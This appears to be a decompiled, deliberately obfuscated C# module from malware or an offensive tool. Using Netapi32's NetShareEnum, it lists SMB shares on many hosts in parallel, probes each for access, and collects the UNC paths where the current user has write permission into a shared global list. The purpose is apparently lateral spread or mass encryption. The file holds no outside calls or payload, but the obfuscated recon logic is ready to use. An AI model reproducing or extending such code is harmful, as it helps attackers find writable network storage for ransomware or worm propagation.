using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace YzTymtbtgFABHvJvj;

internal class xzpVoIOaUnQqluDbk
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct QAwsdEgtIEboFRnu
	{
		public int UBfzlFpdKzLS;

		public string ZDyUlIlZACI;

		public string sMnrsFTdIojpPd;

		public int JXyrwdpsTtjcfYQ;

		public int LeNTuuqEpX;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct aKdAGSVMaT
	{
		public string oAhWCUolwS;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct vHLAyLwLEHILuZr
	{
		public string BpcAcUGdKb;

		public uint aQLaooxxVKpA;

		public string zyafCWCwcMBnJJsA;

		public vHLAyLwLEHILuZr(string sharename, uint sharetype, string remark)
		{
			BpcAcUGdKb = sharename;
			aQLaooxxVKpA = sharetype;
			zyafCWCwcMBnJJsA = remark;
		}

		public override string ToString()
		{
			return BpcAcUGdKb;
		}
	}

	private enum EEkhecTWBxHpFl : uint
	{
		SvUcaSSabPc = 0u,
		LKpoibJjhfEM = 2100u,
		MDSratvgEX = 2116u,
		qmVbVnJOfhxV = 2118u,
		ZNqygxJdiuEev = 2123u
	}

	private enum scTdksqJMRVbUG : uint
	{
		YTBacnJbaoU = 0u,
		fHrmvSWYNDujd = 1u,
		KgFZMOJuaZKJ = 2u,
		XIeliqCBlhmX = 3u,
		uzfQMjFIpfZifMZ = 2147483648u
	}

	[CompilerGenerated]
	private sealed class BxxWzKwtEAJTfaA
	{
		public YOnJwbWHwMZ.yAKvGgIxEaiOXmf kBhFvryvOMfXK;
	}

	[CompilerGenerated]
	private sealed class MPlXKRcYzqOOn
	{
		public BxxWzKwtEAJTfaA BfdXTqkGUz;

		public string JjZADtEyQgOHgZ;

		public void _003CGetAllShares_003Eb__1()
		{
			mrPeldazlPszlXF(JjZADtEyQgOHgZ, BfdXTqkGUz.kBhFvryvOMfXK);
		}
	}

	private const uint qkxCCGbyyNch = uint.MaxValue;

	private const int SvUcaSSabPc = 0;

	public static ReaderWriterLockSlim xLLatCkfnJL = new ReaderWriterLockSlim();

	[DllImport("Netapi32.dll", SetLastError = true)]
	public static extern int NetWkstaGetInfo(string yvnIJbSjYFMBt, int jLJXKSuAUpkzpgO, out IntPtr vUURfeXWVRcgUCVz);

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr pArPvGRuagMYbXW);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder mQusuZpwIWJnBM, int STVFrRIyoT, ref IntPtr WcUyKgJQpxQPY, uint lGcAAZasxhQzh, ref int puUCsBIauVYl, ref int jKbqcdAZXocS, ref int dlsYGtMfOYdw);

	public static vHLAyLwLEHILuZr[] ApdINyaYDBssmv(string EOtUMIQRhw)
	{
		List<vHLAyLwLEHILuZr> list = new List<vHLAyLwLEHILuZr>();
		int puUCsBIauVYl = 0;
		int jKbqcdAZXocS = 0;
		int dlsYGtMfOYdw = 0;
		int num = Marshal.SizeOf(typeof(vHLAyLwLEHILuZr));
		IntPtr WcUyKgJQpxQPY = IntPtr.Zero;
		StringBuilder mQusuZpwIWJnBM = new StringBuilder(EOtUMIQRhw);
		int num2 = NetShareEnum(mQusuZpwIWJnBM, 1, ref WcUyKgJQpxQPY, uint.MaxValue, ref puUCsBIauVYl, ref jKbqcdAZXocS, ref dlsYGtMfOYdw);
		if (num2 == 0)
		{
			IntPtr ptr = WcUyKgJQpxQPY;
			for (int i = 0; i < puUCsBIauVYl; i++)
			{
				vHLAyLwLEHILuZr item = (vHLAyLwLEHILuZr)Marshal.PtrToStructure(ptr, typeof(vHLAyLwLEHILuZr));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(WcUyKgJQpxQPY);
			return list.ToArray();
		}
		list.Add(new vHLAyLwLEHILuZr("ERROR=" + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void mrPeldazlPszlXF(string xqkwSieXTPle, YOnJwbWHwMZ.yAKvGgIxEaiOXmf yVXQabzZAx)
	{
		string[] source = new string[2] { "ERROR=53", "ERROR=5" };
		vHLAyLwLEHILuZr[] array = ApdINyaYDBssmv(xqkwSieXTPle);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			vHLAyLwLEHILuZr[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				vHLAyLwLEHILuZr vHLAyLwLEHILuZr = array2[i];
				if (yVXQabzZAx.qoPExOwCww != null && yVXQabzZAx.qoPExOwCww.Contains(vHLAyLwLEHILuZr.BpcAcUGdKb.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = $"\\\\{xqkwSieXTPle}\\{vHLAyLwLEHILuZr.BpcAcUGdKb}";
					Directory.GetFiles(text);
					list.Add(vHLAyLwLEHILuZr.BpcAcUGdKb);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!eqCksjvMyn.vNjCRxJChaZG.Contains(text))
							{
								eqCksjvMyn.vNjCRxJChaZG.Add(text);
							}
							list2.Add(vHLAyLwLEHILuZr.BpcAcUGdKb);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(vHLAyLwLEHILuZr.BpcAcUGdKb))
					{
						list3.Add(vHLAyLwLEHILuZr.BpcAcUGdKb);
					}
				}
			}
		}
		FLnCjxXfKDRbOeF.ejGFIRhniCOZG++;
	}

	public static void kbjtBejKvpbRy(string JIIYJRVCGh, string wfaPlghUAZn)
	{
		xLLatCkfnJL.EnterWriteLock();
		try
		{
			using StreamWriter streamWriter = File.AppendText(wfaPlghUAZn);
			streamWriter.WriteLine(JIIYJRVCGh);
			streamWriter.Close();
		}
		finally
		{
			xLLatCkfnJL.ExitWriteLock();
		}
	}

	public static void ZfEGJlxsTfnbp(List<string> rvkYCgVBqnXB, YOnJwbWHwMZ.yAKvGgIxEaiOXmf aoHMYeDGqQGZKAr)
	{
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = rvkYCgVBqnXB.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				string JjZADtEyQgOHgZ = enumerator.Current;
				action = delegate
				{
					mrPeldazlPszlXF(JjZADtEyQgOHgZ, aoHMYeDGqQGZKAr);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = aoHMYeDGqQGZKAr.oCNtrxaxlm;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}
}
